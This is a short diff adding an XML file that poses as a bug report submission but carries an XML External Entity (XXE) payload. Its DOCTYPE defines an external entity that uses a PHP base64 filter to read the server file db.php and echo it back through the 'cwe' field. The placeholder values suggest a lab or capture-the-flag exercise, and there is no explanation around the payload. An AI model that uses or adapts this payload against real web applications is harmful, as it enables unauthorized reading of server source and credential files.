@@ -1,0 +1,8 @@
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+		<bugreport>
+		<title>asd</title>
+		<cwe>&xxe;</cwe>
+		<cvss>asd</cvss>
+		<reward>asd</reward>
+		</bugreport>
